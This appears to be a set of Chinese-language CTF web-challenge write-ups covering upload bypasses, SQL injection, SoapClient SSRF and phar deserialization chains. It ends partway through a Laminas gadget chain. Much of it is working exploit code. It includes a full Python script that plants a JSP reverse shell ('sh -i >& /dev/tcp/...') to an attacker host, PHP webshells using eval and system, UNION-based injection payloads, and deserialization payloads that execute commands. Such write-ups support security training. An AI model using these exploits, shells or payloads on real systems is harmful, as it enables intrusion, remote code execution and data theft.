## [MRCTF2020]你传你🐎呢 #文件上传
文件上传发现被过滤

![](attachments/Pasted%20image%2020230415111247.png)

修改content-type 为image/jpeg和后缀名后上传成功

![](attachments/Pasted%20image%2020230415111607.png)

/var/www/html/upload/ebe5b85736548ba0a494c533dec573bc/shell.jpg

这里写.htaccess文件更改解析

```
AddType application/x-httpd-php .jpg
```

执行命令的时候发现没反应，phpinfo后发现是ban了system

![](attachments/Pasted%20image%2020230415112615.png)

直接蚁剑，蚁剑坏了，利用无参rce的技巧来读

print_r(scandir("."))

![](attachments/Pasted%20image%2020230415113607.png)


![](attachments/Pasted%20image%2020230415113703.png)

## [MRCTF2020]Ez_bypass

访问主页面
```php
I put something in F12 for you include 'flag.php'; 
$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}'; 
if(isset($_GET['gg'])&&isset($_GET['id'])) { 
	$id=$_GET['id']; $gg=$_GET['gg']; 
	if (md5($id) === md5($gg) && $id !== $gg) { 
		echo 'You got the first step'; 
		if(isset($_POST['passwd'])) { 
			$passwd=$_POST['passwd']; 
				if (!is_numeric($passwd)) { 
					if($passwd==1234567) { 
						echo 'Good Job!'; 
						highlight_file('flag.php'); 
						die('By Retr_0'); } 
					else { 
						echo "can you think twice??"; 
						} 
					} 
				else{ 
					echo 'You can not get it !'; 
					} 
				}
			else{ 
				die('only one way to get the flag'); 
				} 
			} 
		else { 
			echo "You are not a real hacker!"; 
			} 
		} 
	else{ 
		die('Please input first'); 
		} 
	}
Please input first
```

其实就是md5的无法处理数组和比较类型问题

![](attachments/Pasted%20image%2020230415114824.png)

## [MRCTF2020]Ezpop-Revenge #Soap  #SSRF #反序列化
`www.zip`源码泄露

flag.php
```php
<?php  
if(!isset($_SESSION)) session_start();  
if($_SERVER['REMOTE_ADDR']==="127.0.0.1"){  
   $_SESSION['flag']= "MRCTF{******}";  
}else echo "我扌your problem?\nonly localhost can get flag!";  
?>
```

猜测是反序列化结合ssrf，可能存在的反序列化点：
- phar文件上传
- 用户输入反序列化

在全局找serialize函数发现在HelloWorld下的Plugin.php有特别的反序列化点

![](attachments/Pasted%20image%2020230420114048.png)

```php
<?php  
if (!defined('__TYPECHO_ROOT_DIR__')) exit;  
/**  
 * Hello World ** @package HelloWorld   
* @author qining  
 * @version 1.0.0  
 * @link http://typecho.org  
 */class HelloWorld_DB{  
    private $flag="MRCTF{this_is_a_fake_flag}";  
    private $coincidence;  
    function  __wakeup(){  
        $db = new Typecho_Db($this->coincidence['hello'], $this->coincidence['world']);  
    }  
}  
class HelloWorld_Plugin implements Typecho_Plugin_Interface  
{  
    /**  
     * 激活插件方法,如果激活失败,直接抛出异常  
     *   
* @access public  
     * @return void  
     * @throws Typecho_Plugin_Exception  
     */    
     public static function activate()  
    {        
    Typecho_Plugin::factory('admin/menu.php')->navBar = array('HelloWorld_Plugin', 'render');  
    }  
    /**  
     * 禁用插件方法,如果禁用失败,直接抛出异常  
     *   
* @static  
     * @access public  
     * @return void  
     * @throws Typecho_Plugin_Exception  
     */    
     public static function deactivate(){}  
    /**  
     * 获取插件配置面板  
     *   
* @access public  
     * @param Typecho_Widget_Helper_Form $form 配置面板  
     * @return void  
     */   
     public static function config(Typecho_Widget_Helper_Form $form)  
    {        /** 分类名称 */  
        $name = new Typecho_Widget_Helper_Form_Element_Text('word', NULL, 'Hello World', _t('说点什么'));  
        $form->addInput($name);  
    }  
    /**  
     * 个人用户的配置面板  
     *   
* @access public  
     * @param Typecho_Widget_Helper_Form $form  
     * @return void  
     */    
     public static function personalConfig(Typecho_Widget_Helper_Form $form){}  
    /**  
     * 插件实现方法  
     *   
* @access public  
     * @return void  
     */    
     public static function render()  
    {        echo '<span class="message success">'  
            . htmlspecialchars(Typecho_Widget::widget('Widget_Options')->plugin('HelloWorld')->word)  
            . '</span>';  
    }
    public function action(){  
        if(!isset($_SESSION)) session_start();  
        if(isset($_REQUEST['admin'])) var_dump($_SESSION);  
        if (isset($_POST['C0incid3nc3'])) {  
         if(preg_match("/file|assert|eval|[`\'~^?<>$%]+/i",base64_decode($_POST['C0incid3nc3'])) === 0)  
            unserialize(base64_decode($_POST['C0incid3nc3']));  
         else {  
            echo "Not that easy.";  
         }  
        }    }}
```

在Plugin.php的__wakeup方法中，new了一个新的类，跟进到var/Typecho/Db.php，在它的__construct函数中出现了字符串拼接

![](attachments/Pasted%20image%2020230420115245.png)

找了__toString()魔术方法

![](attachments/Pasted%20image%2020230420120015.png)

```php
  
public function __toString()  
{  
    switch ($this->_sqlPreBuild['action']) {  
        case Typecho_Db::SELECT:  
            return $this->_adapter->parseSelect($this->_sqlPreBuild);  
        case Typecho_Db::INSERT:  
            return 'INSERT INTO '  
            . $this->_sqlPreBuild['table']  
            . '(' . implode(' , ', array_keys($this->_sqlPreBuild['rows'])) . ')'  
            . ' VALUES '  
            . '(' . implode(' , ', array_values($this->_sqlPreBuild['rows'])) . ')'  
            . $this->_sqlPreBuild['limit'];  
        case Typecho_Db::DELETE:  
            return 'DELETE FROM '  
            . $this->_sqlPreBuild['table']  
            . $this->_sqlPreBuild['where'];  
        case Typecho_Db::UPDATE:  
            $columns = array();  
            if (isset($this->_sqlPreBuild['rows'])) {  
                foreach ($this->_sqlPreBuild['rows'] as $key => $val) {  
                    $columns[] = "$key = $val";  
                }  
            }  
            return 'UPDATE '  
            . $this->_sqlPreBuild['table']  
            . ' SET ' . implode(' , ', $columns)  
            . $this->_sqlPreBuild['where'];  
        default:  
            return NULL;  
    }  
}
```

这里的第一个case的return形式很容易想到调用__call(),结合前面的ssrf这里将_adapter设置成soapclient，利用它的__call方法来设置报文头

[PHP SOAP使用 - KvienChen - 博客园 (cnblogs.com)](https://www.cnblogs.com/kvienchen/p/8310798.html)

这里的pop链流程
`HelloWorld_DB::__wakeup`->`Typecho_Db::__contrust(__toString)`->`Typecho_Db_Query::__contrust(this->_adapter=new Soapclient)`

```php
<?php
class Typecho_Db_Query
{
    private $_sqlPreBuild;
    private $_adapter;

    /**
     * @throws SoapFault
     */
    public function __construct()
    {
        $host = "http://127.0.0.1/flag.php";
        $header = array('X-Forwarded-For: 127.0.0.1','Cookie: PHPSESSID=09iejf3jroh277kirj14795qi3');
        $this->_sqlPreBuild['action'] = 'SELECT';
        $this->_adapter = new SoapClient(null, array('location'=>$host, 'user_agent'=>'wuwumonster^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$header),'uri'=> "wuwumonster"));
    }
}

class Typecho_Db
{
    public function __construct($adapterName, $prefix = 'typecho_')
    {
        $adapterName = 'Typecho_Db_Adapter_' . $adapterName;
    }
}
class HelloWorld_DB
{
    private $coincidence;
    function __construct()
    {
        $this->coincidence = (['hello' => new Typecho_Db_Query(), 'world' => 'typecho_']);
    }
    function  __wakeup(){
        $db = new Typecho_Db($this->coincidence['hello'], $this->coincidence['world']);
    }
}

$ser = serialize(new HelloWorld_DB());
print($ser);
$ser_b64 = base64_encode($ser);
print('
');
print($ser_b64);

```

反序列化点的路由

![](attachments/Pasted%20image%2020230420132110.png)

发现被过滤
```php
public function action(){  
     if(!isset($_SESSION)) session_start();  
     if(isset($_REQUEST['admin'])) var_dump($_SESSION);  
     if (isset($_POST['C0incid3nc3'])) {  
if(preg_match("/file|assert|eval|[`\'~^?<>$%]+/i",base64_decode($_POST['C0incid3nc3'])) === 0)  
   unserialize(base64_decode($_POST['C0incid3nc3']));  
else {  
   echo "Not that easy.";  
}  
     } 
}
```

发现是`^^`被匹配到了这里将他换为`\r\n`

在用payload传参后只需要带着一样的phpsessid去访问就可以了
![](attachments/Pasted%20image%2020230420141459.png)

最终exp

```php
<?php  
class Typecho_Db_Query  
{  
    private $_sqlPreBuild;  
    private $_adapter;  
  
    public function __construct()  
    {        
	    $host = "http://127.0.0.1/flag.php";  
        $header = array('Cookie: PHPSESSID=4mrff5ndm9o9irau6bq0na38n6',);  
        $this->_sqlPreBuild['action'] = 'SELECT';  
        $this->_adapter = new SoapClient(null, array('location'=>$host, 'user_agent'=>str_replace('^^', "\r\n",'wuwumonster^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$header)),'uri'=> "wuwumonster"));  
    }  
}  
  
class Typecho_Db  
{  
    public function __construct($adapterName, $prefix = 'typecho_')  
    {        $adapterName = 'Typecho_Db_Adapter_' . $adapterName;  
    }  
}  
class HelloWorld_DB  
{  
    private $coincidence;  
    function __construct()  
    {        $this->coincidence = (['hello' => new Typecho_Db_Query(), 'world' => 'typecho_']);  
    }  
    function  __wakeup(){  
        $db = new Typecho_Db($this->coincidence['hello'], $this->coincidence['world']);  
    }  
}  
  
$ser = serialize(new HelloWorld_DB());  
  
print($ser);  
$ser_b64 = base64_encode($ser);  
print('  
');  
if(preg_match("/file|assert|eval|[`\'~^?<>$%]+/i",base64_decode($ser_b64)) === 0){  
    print($ser_b64);  
}  
else{  
    print("matched");  
}
```

## [RoarCTF 2019]PHPShe

是phpshe的cms
对应插件存在sql注入漏洞
[代码审计之phpshev1.7前台注入和zzzphpv1.74后台sql注入 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/254237.html)

payload：
```
/include/plugin/payment/alipay/pay.php?id=pay`%20where%201=1%20union%20select%201,2,((select`3`from(select%201,2,3,4,5,6%20union%20select%20*%20from%20admin)a%20limit%201,1)),4,5,6,7,8,9,10,11,12%23_
```

注出来的value是md5值需要解密

![](attachments/Pasted%20image%2020230415121448.png)

![](attachments/Pasted%20image%2020230415121345.png)

admin/atlman777   登录后台

搜索后并没有phpshe的后台漏洞，再在后台最可能的是文件上传来rce，按理来说应该是出题人对源码做了修改，自己憋了个洞出来，但是官方源码没有以前的版本，只有最新的。。。，这样就只能自己审计了

![](attachments/Pasted%20image%2020230415122154.png)

seay扫了一下

![](attachments/Pasted%20image%2020230415123155.png)

pclzip.class.php的问题是最多的，就从这里开始慢慢审计

粗略看的时候发现有个__destruct

![](attachments/Pasted%20image%2020230415124136.png)

这里构造反序列化的话save_path是可控的，从功能上讲可以通过控制save_path来控制解压位置，现在的想法是上传压缩的webshell然后通过控制解压路径解压到能够访问的路径
现在需要找一个能够触发反序列化的点

在找unserliaze的时候发现大多都写死了序列化内容，没有写死的不是很复杂就是变量不可控，现在来考虑能够触发phar的函数，pclzip.class.php中的无法利用，而其他文件中的大多复杂且参数不可控，这里的glob.func.php中的是可控的，删除文件夹的函数

![](attachments/Pasted%20image%2020230415132901.png)

这个函数在moban.php中有调用且参数可控

![](attachments/Pasted%20image%2020230415133140.png)

这里pe_token_match的判断token，这个token是在登录的时候就有对应函数设置好的，是用来校验admin的

![](attachments/Pasted%20image%2020230415133657.png)

上传shell压缩包，路径为/data/attachment/brand/2.zip

![](attachments/Pasted%20image%2020230415132134.png)

提交phar的时候记录pe_token    c9ef985805818f52722ca596862b8928

![](attachments/Pasted%20image%2020230415134742.png)

然后构造一个删除的payload
admin.php?mod=moban&act=del&token=c9ef985805818f52722ca596862b8928&tpl=phar:///var/www/html/data/attachment/brand/7.txt

![](attachments/Pasted%20image%2020230415140103.png)

就触发了phar包将压缩的webshell解压到了对应文件夹

![](attachments/Pasted%20image%2020230415140212.png)


## [虎符CTF 2021]Internal System

F12,提示有source

![](attachments/Pasted%20image%2020230416114326.png)

```python
const express = require('express')
const router = express.Router()

const axios = require('axios')

const isIp = require('is-ip')
const IP = require('ip')

const UrlParse = require('url-parse')

const {sha256, hint} = require('./utils')

const salt = 'nooooooooodejssssssssss8_issssss_beeeeest'

const adminHash = sha256(sha256(salt + 'admin') + sha256(salt + 'admin'))

const port = process.env.PORT || 3000

function formatResopnse(response) {
  if(typeof(response) !== typeof('')) {
    return JSON.stringify(response)
  } else {
    return response
  }
}

function SSRF_WAF(url) {
  const host = new UrlParse(url).hostname.replace(/\[|\]/g, '')

  return isIp(host) && IP.isPublic(host)
}

function FLAG_WAF(url) {
  const pathname = new UrlParse(url).pathname
  return !pathname.startsWith('/flag')
}

function OTHER_WAF(url) {
  return true;
}

const WAF_LISTS = [OTHER_WAF, SSRF_WAF, FLAG_WAF]

router.get('/', (req, res, next) => {
  if(req.session.admin === undefined || req.session.admin === null) {
    res.redirect('/login')
  } else {
    res.redirect('/index')
  }
})

router.get('/login', (req, res, next) => {
  const {username, password} = req.query;

  if(!username || !password || username === password || username.length === password.length || username === 'admin') {
    res.render('login')
  } else {
    const hash = sha256(sha256(salt + username) + sha256(salt + password))

    req.session.admin = hash === adminHash

    res.redirect('/index')
  }
})

router.get('/index', (req, res, next) => {
  if(req.session.admin === undefined || req.session.admin === null) {
    res.redirect('/login')
  } else {
    res.render('index', {admin: req.session.admin, network: JSON.stringify(require('os').networkInterfaces())})
  }
})

router.get('/proxy', async(req, res, next) => {
  if(!req.session.admin) {
    return res.redirect('/index')
  }
  const url = decodeURI(req.query.url);

  console.log(url)

  const status = WAF_LISTS.map((waf)=>waf(url)).reduce((a,b)=>a&&b)

  if(!status) {
    res.render('base', {title: 'WAF', content: "Here is the waf..."})
  } else {
    try {
      const response = await axios.get(`http://127.0.0.1:${port}/search?url=${url}`)
      res.render('base', response.data)
    } catch(error) {
      res.render('base', error.message)
    }
  }
})

router.post('/proxy', async(req, res, next) => {
  if(!req.session.admin) {
    return res.redirect('/index')
  }
  // test url
  // not implemented here
  const url = "https://postman-echo.com/post"
  await axios.post(`http://127.0.0.1:${port}/search?url=${url}`)
  res.render('base', "Something needs to be implemented")
})


router.all('/search', async (req, res, next) => {
  if(!/127\.0\.0\.1/.test(req.ip)){
    return res.send({title: 'Error', content: 'You can only use proxy to aceess here!'})
  }

  const result = {title: 'Search Success', content: ''}

  const method = req.method.toLowerCase()
  const url = decodeURI(req.query.url)
  const data = req.body

  try {
    if(method == 'get') {
      const response = await axios.get(url)
      result.content = formatResopnse(response.data)
    } else if(method == 'post') {
      const response = await axios.post(url, data)
      result.content = formatResopnse(response.data)
    } else {
      result.title = 'Error'
      result.content = 'Unsupported Method'
    }
  } catch(error) {
    result.title = 'Error'
    result.content = error.message
  }

  return res.json(result)
})

router.get('/source', (req, res, next)=>{
  res.sendFile( __dirname + "/" + "index.js");
})

router.get('/flag', (req, res, next) => {
  if(!/127\.0\.0\.1/.test(req.ip)){
    return res.send({title: 'Error', content: 'No Flag For You!'})
  }
  return res.json({hint: hint})
})

module.exports = router
```

## [RWCTF2022]DesperateCat

出题人文章：[RWCTF 4th Desperate Cat Writeup - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/461743167)

el表达式解析
```java
${pageContext.servletContext.classLoader.resources.context.manager.pathname=param.a}
//修改 Session 文件存储路径
${sessionScope[param.b]=param.c}
//往 Session 里写数据
${pageContext.servletContext.classLoader.resources.context.reloadable=true}
//Context reloadable 配置为 true（默认是 false）
${pageContext.servletContext.classLoader.resources.context.parent.appBase=param.d}
//修改整个 Tomcat 的 appBase 目录
```

这里直接贴exp
exp.py
```python
#!/usr/bin/env python3

import sys
import time
import requests

PROXIES = None

if __name__ == '__main__':
    target_url = sys.argv[1]    # e.g. http://47.243.235.228:39465/
    reverse_shell_host = sys.argv[2]
    reverse_shell_port = sys.argv[3]
    el_payload = r"""${pageContext.servletContext.classLoader.resources.context.manager.pathname=param.a}
${sessionScope[param.b]=param.c}
${pageContext.servletContext.classLoader.resources.context.reloadable=true}
${pageContext.servletContext.classLoader.resources.context.parent.appBase=param.d}"""
    reverse_shell_jsp_payload = r"""<%Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", "sh -i >& /dev/tcp/""" + reverse_shell_host + "/" + reverse_shell_port + r""" 0>&1"});%>"""
    r = requests.post(url=f'{target_url}/export',
    data={
    'dir': '',
    'filename': 'a.jsp',
    'content': el_payload,
    },
    proxies=PROXIES)
    shell_path = r.text.strip().split('/')[-1]
    shell_url = f'{target_url}/export/{shell_path}'
    r2 = requests.post(url=shell_url,
    data={
        'a': '/tmp/session.jsp',
        'b': 'voidfyoo',
        'c': reverse_shell_jsp_payload,
        'd': '/',
    },
    proxies=PROXIES)
    r3 = requests.post(url=f'{target_url}/export',
    data={
        'dir': './WEB-INF/lib/',
        'filename': 'a.jar',
        'content': 'a',
    },
    proxies=PROXIES)
    time.sleep(10)  # wait a while
    r4 = requests.get(url=f'{target_url}/tmp/session.jsp', proxies=PROXIES)
```


## [MRCTF2020]PYWebsite #X-Forwarded-For

随便输入了一个授权码，准备burp抓包看看

![Untitled](../BUU月赛/attachment/报文%20019ea677a93543f29c490565add77c3d/Untitled.png)

结果抓到结果还没放过去，浏览器就已经报授权码错误了，F12看看

![Untitled](../BUU月赛/attachment/报文%20019ea677a93543f29c490565add77c3d/Untitled%201.png)

发现是访问到flag.php的直接去访问

![Untitled](../BUU月赛/attachment/报文%20019ea677a93543f29c490565add77c3d/Untitled%202.png)

提到了IP和自己可以看到flag，再访问的时候加一个X-Forwarded-For头

![Untitled](../BUU月赛/attachment/报文%20019ea677a93543f29c490565add77c3d/Untitled%203.png)

F12拿下

![Untitled](../BUU月赛/attachment/报文%20019ea677a93543f29c490565add77c3d/Untitled%204.png)



## [0CTF 2016]piapiapia #反序列化字符逃逸

dirsearch

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled.png)

源码泄露后，seay看一下

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%201.png)

class.php`[show_profile]`

profile.php`[$profile=$user→show_profile($username)→unserialize($profile)→$photo = base64_encode(file_get_conents($profile[’photo’]))]`

$profile

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%202.png)

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%203.png)

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%204.png)

在进行update_profile操作的时候会将序列化的数据中的select,insert,update,delete,where替换为hacker而where和hacker字符长度不同可以产生反序列化字符逃逸每个where可以逃逸一个字符
想要使profile.php中能够echo出config的内容在nickname这里构造自己想要的photo值
where”;s:5:”photo”;s:10:”config.php”;}
在后面一共有34个字符那么就传入34个where来进行替换逃逸


对nickname的过滤可以直接通过数组来绕过

`wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}`

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%205.png)

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%206.png)

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%207.png)


## [SWPUCTF 2016]Web blogsys #变量覆盖

通过找回密码泄露admin的salt值MD5

YWI0ZDIyOTI1ZDI2OGRkNjkzN2U0MWVkYmU4MWU5N2U

解开base64

ab4d22925d268dd6937e41edbe81e97e

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%209.png)

哈希拓展攻击伪造

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2010.png)

Payload:  `'\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00admin'`
Payload urlencode: `%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80%00%00%00%00%00%00%00admin
md5: 6122c04e8a1f3529d556199960ef2556`

删除用户的反序列化payload

userid为cookie中user的值base64解码后的第一个数字

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2011.png)

```php
<?php
class admin
{
    var $name = "admin";
    var $check = "6122c04e8a1f3529d556199960ef2556";
    var $data = "\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00admin";
    var $method = "del_user";
    var $userid = "2";
}

$a = new admin();
$api = serialize(base64_encode($a));
```

`Tzo1OiJhZG1pbiI6NTp7czo0OiJuYW1lIjtzOjU6ImFkbWluIjtzOjU6ImNoZWNrIjtzOjMyOiI2MTIyYzA0ZThhMWYzNTI5ZDU1NjE5OTk2MGVmMjU1NiI7czo0OiJkYXRhIjtzOjQ4OiKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAiO3M6NjoibWV0aG9kIjtzOjg6ImRlbF91c2VyIjtzOjY6InVzZXJpZCI7czoxOiIyIjt9`

用api.php?api=传入

ps：需要在一个新的页面传入，大概是因为对session值有检测

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2012.png)

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2013.png)

此时userid值在数据库中被置空了id值不会被传入新值，可以进行变量覆盖

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2014.png)

## [D3CTF 2019]EzUpload 

题目直接就是代码

```php
<?php
class dir{
    public $userdir;
    public $url;
    public $filename;
    public function __construct($url,$filename) {
        $this->userdir = "upload/" . md5($_SERVER["REMOTE_ADDR"]);
        $this->url = $url;
        $this->filename  =  $filename;
        if (!file_exists($this->userdir)) {
            mkdir($this->userdir, 0777, true);
        }
    }
    public function checkdir(){
        if ($this->userdir != "upload/" . md5($_SERVER["REMOTE_ADDR"])) {
            die('hacker!!!');
        }
    }
    public function checkurl(){
        $r = parse_url($this->url);
        if (!isset($r['scheme']) || preg_match("/file|php/i",$r['scheme'])){
            die('hacker!!!');
        }
    }
    public function checkext(){
        if (stristr($this->filename,'..')){
            die('hacker!!!');
        }
        if (stristr($this->filename,'/')){
            die('hacker!!!');
        }
        $ext = substr($this->filename, strrpos($this->filename, ".") + 1);
        if (preg_match("/ph/i", $ext)){
            die('hacker!!!');
        }
    }
    public function upload(){
        $this->checkdir();
        $this->checkurl();
        $this->checkext();
        $content = file_get_contents($this->url,NULL,NULL,0,2048);
        if (preg_match("/\<\?|value|on|type|flag|auto|set|\\\\/i", $content)){
            die('hacker!!!');
        }
        file_put_contents($this->userdir."/".$this->filename,$content);
    }
    public function remove(){
        $this->checkdir();
        $this->checkext();
        if (file_exists($this->userdir."/".$this->filename)){
            unlink($this->userdir."/".$this->filename);
        }
    }
    public function count($dir) {
        if ($dir === ''){
            $num = count(scandir($this->userdir)) - 2;
        }
        else {
            $num = count(scandir($dir)) - 2;
        }
        if($num > 0) {
            return "you have $num files";
        }
        else{
            return "you don't have file";
        }
    }
    public function __toString() {
        return implode(" ",scandir(__DIR__."/".$this->userdir));
    }
    public function __destruct() {
        $string = "your file in : ".$this->userdir;
        file_put_contents($this->filename.".txt", $string);
        echo $string;
    }
}

if (!isset($_POST['action']) || !isset($_POST['url']) || !isset($_POST['filename'])){
    highlight_file(__FILE__);
    die();
}

$dir = new dir($_POST['url'],$_POST['filename']);
if($_POST['action'] === "upload") {
    $dir->upload();
}
elseif ($_POST['action'] === "remove") {
    $dir->remove();
}
elseif ($_POST['action'] === "count") {
    if (!isset($_POST['dir'])){
        echo $dir->count('');
    } else {
        echo $dir->count($_POST['dir']);
    }
}

```

**函数功能分析：**

- upload

创建沙盒，对url，filename及后缀名进行检测，在内容检测后写入

- remove

删除文件

- count

扫文件数目

在对url的检测中ban了file和php，可以利用data伪协议来传输.htaccess来绕过黑名单

```php
AddHandler php7-script .txt
```

`action=upload&filename=.htaccess&url=data:image/png;base64,QWRkSGFuZGxlciBwaHA3LXNjcmlwdCAudHh0`

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2015.png)

由于构析函数中当前路径为根目录

想要写shell的话还需要拿到绝对路径

没有ban phar伪协议可以做phar反序列化

```php
<?php
class dir{
    public $userdir;
    public $url;
    public $filename;
}
$a=new dir();
$b=new dir();
$b->userdir='..';
$a->userdir=$b;
@unlink("phar.phar");
$phar=new Phar("phar.phar");
$phar->startBuffering(); 
$phar->setStub('GIF89a'."__HALT_COMPILER();"); 
$phar->setMetadata($a); 
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
```

用http远程包含后再用phar伪协议触发phar反序列化

也可以选择data伪协议来写入

`action=upload&filename=1.txt&url=data:image/png;base64,R0lGODlhX19IQUxUX0NPTVBJTEVSKCk7ID8+DQqqAAAAAQAAABEAAAABAAAAAAB0AAAATzozOiJkaXIiOjM6e3M6NzoidXNlcmRpciI7TzozOiJkaXIiOjM6e3M6NzoidXNlcmRpciI7TjtzOjM6InVybCI7TjtzOjg6ImZpbGVuYW1lIjtOO31zOjM6InVybCI7TjtzOjg6ImZpbGVuYW1lIjtOO30IAAAAdGVzdC50eHQEAAAAZ/A3YwQAAAAMfn/YtgEAAAAAAAB0ZXN0ArqSkUWwQg9QITOBtgBp0RLFDjkCAAAAR0JNQg==`

`action=upload&filename=1.jpg&url=phar://upload/c47b21fcf8f0bc8b3920541abd8024fd/1.jpg`

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2016.png)

这是目录781877bda0783aac

```php
<?php
class dir{
    public $userdir;
    public $url;
    public $filename;
}
$a=new dir();
$a->filename='/var/www/html/abebb7c39f4b5e46/upload/c47b21fcf8f0bc8b3920541abd8024fd/shell';
$a->userdir = '<?php eval($_POST[1]);?>';
@unlink("phar.phar");
$phar=new Phar("phar.phar");
$phar->startBuffering(); 
$phar->setStub('GIF89a'."__HALT_COMPILER();"); 
$phar->setMetadata($a); 
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
```

需要gzip打包，phar伪协议可以识别zip,gzip打包过的phar包

这个时候就已经有shell.txt了加上.htacess就可以直接解析了

## [HarekazeCTF2019]Avatar Uploader 2

seay扫一下，就两个点，一个上传一个包含。大概也就这样利用

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2017.png)

先看upload.php

```php

<?php
error_reporting(0);

require_once('config.php');
require_once('lib/util.php');
require_once('lib/session.php');

$session = new SecureClientSession(CLIENT_SESSION_ID, SECRET_KEY);

// check whether file is uploaded
if (!file_exists($_FILES['file']['tmp_name']) || !is_uploaded_file($_FILES['file']['tmp_name'])) {
  error('No file was uploaded.');
}

// check file size
if ($_FILES['file']['size'] > 256000) {
  error('Uploaded file is too large.');
}

// check file type
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$type = finfo_file($finfo, $_FILES['file']['tmp_name']);
finfo_close($finfo);
if (!in_array($type, ['image/png'])) {
  error('Uploaded file is not PNG format.');
}

// check file width/height
$size = getimagesize($_FILES['file']['tmp_name']);
if ($size[0] > 256 || $size[1] > 256) {
  error('Uploaded image is too large.');
}
if ($size[2] !== IMAGETYPE_PNG) {
  // I hope this never happens...
  error('What happened...? OK, the flag for part 1 is: <code>' . getenv('FLAG1') . '</code>');
}

// ok
$filename = bin2hex(random_bytes(4)) . '.png';
move_uploaded_file($_FILES['file']['tmp_name'], UPLOAD_DIR . '/' . $filename);

$session->set('avatar', $filename);
flash('info', 'Your avatar has been successfully updated!');
redirect('/');
```

有对文件类型的检查和png_header的检查，最后会将文件随机文件名人后放到uploads下

伪造文件头上传png

```php
<?php
$png_header = hex2bin('89504e470d0a1a0a0000000d49484452000000400000004000');
$phar = new Phar('exp.phar');
$phar->startBuffering();
$phar->addFromString('exp.css', '<?php system($_GET["wumonster"]); ?>');
$phar->setStub($png_header. '<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2018.png)

用uitl.php中函数进行解密

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2019.png)

更改cookie中theme的值来进行文件包含，这里能够更改的原因是因为

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2020.png)

命令执行拿flag就可

## [HMGCTF2022]Fan Website #phar反序列化

关键代码

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2021.png)

在imguploudAcion中有正则匹配过滤，在imgdeleteAction中存在unlink大概就是反序列化，在正则中有phar文件头，可以gzip压缩绕过
那么现在主要就是找pop链，seay扫了一下后发现报告都来自vendor中，查看composer.json后发现,
大量的引用了laminas框架，laminas是zend的替代项目,
小搜一手发现存在CVE-2021-3007的Zend漏洞同时影响了部分laminas项目,别人的wp都说是已知的链子，为什么我找不到
那就研究一下这条链子吧

```php
<?php

namespace Laminas\View\Resolver{
    class TemplateMapResolver{
        protected $map = ["setBody"=>"system"];
    }
}
namespace Laminas\View\Renderer{
    class PhpRenderer{
        private $__helpers;
        function __construct(){
            $this->__helpers = new \Laminas\View\Resolver\TemplateMapResolver();
        }
    }
}

namespace Laminas\Log\Writer{
    abstract class AbstractWriter{}

    class Mail extends AbstractWriter{
        protected $eventsToMail = ["cat /flag"];
        protected $subjectPrependText = null;
        protected $mail;
        function __construct(){
            $this->mail = new \Laminas\View\Renderer\PhpRenderer();
        }
    }
}

namespace Laminas\Log{
    class Logger{
        protected $writers;
        function __construct(){
            $this->writers = [new \Laminas\Log\Writer\Mail()];
        }
    }
}

namespace{
    $a = new \Laminas\Log\Logger();
